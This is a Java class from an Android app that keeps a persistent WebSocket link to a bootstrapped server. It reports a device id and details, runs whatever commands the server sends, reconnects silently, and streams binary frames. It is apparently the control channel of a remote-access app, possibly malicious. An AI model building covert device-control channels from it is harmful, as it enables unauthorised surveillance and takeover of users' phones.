package com.aval.seg;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.util.concurrent.atomic.AtomicBoolean;

public final class Net {
    private static volatile WebSocketClient ws;
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final AtomicBoolean busy = new AtomicBoolean();
    private static volatile int fails;

    public static synchronized void start(final Context c) {
        if (busy.get() || (ws != null && ws.isOpen())) return;
        busy.set(true);
        new Thread(() -> {
            try {
                final String url = Util.bootstrap(c);
                ws = new WebSocketClient(URI.create(url)) {
                    @Override public void onOpen(ServerHandshake h) {
                        busy.set(false);
                        fails = 0;
                        send("{\"t\":\"hello\",\"id\":\"" + Cfg.id(c) + "\"," + Util.dev(c) + "}");
                    }
                    @Override public void onMessage(String m) { Cmd.handle(c, m); }
                    @Override public void onClose(int code, String r, boolean remote) {
                        busy.set(false);
                        H.postDelayed(() -> start(c), backoff());
                    }
                    @Override public void onError(Exception e) { busy.set(false); }
                };
                ws.setConnectionLostTimeout(20);
                ws.connectBlocking();
            } catch (Throwable t) {
                busy.set(false);
                H.postDelayed(() -> start(c), backoff());
            }
        }).start();
    }

    private static long backoff() {
        fails = Math.min(fails + 1, 6);
        long base = 3000L * fails;
        return base + (long) (Math.random() * 1500);
    }

    public static void send(String s) {
        try {
            WebSocketClient w = ws;
            if (w != null && w.isOpen()) w.send(s);
        } catch (Throwable ignored) {}
    }

    public static void sendBin(byte[] b) {
        try {
            WebSocketClient w = ws;
            if (w == null || !w.isOpen()) return;
            if (w.hasBufferedData()) return;   // nao acumula frame se a rede travou
            w.send(b);
        } catch (Throwable ignored) {}
    }

    public static boolean online() {
        WebSocketClient w = ws;
        return w != null && w.isOpen();
    }
}